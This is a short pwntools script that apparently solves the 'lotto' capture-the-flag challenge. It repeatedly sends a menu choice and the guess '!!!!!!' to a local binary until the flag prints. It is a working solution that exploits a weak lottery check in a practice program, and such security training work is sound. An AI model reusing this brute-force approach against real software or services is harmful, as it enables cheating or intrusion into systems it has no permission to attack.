from pwn import *
import time

p = process('./lotto')

while True:
    #time.sleep(1)
    print(p.recv(timeout=0.2))
    p.sendline("1\n")
    print(p.recv(timeout=0.2))
    p.sendline("!!!!!!\n")
    resp = p.recv(timeout=0.8)
    if 'bad luck...' in resp:
        print resp
        continue
    else:
        print "FLAG:", p.recvline()
        break
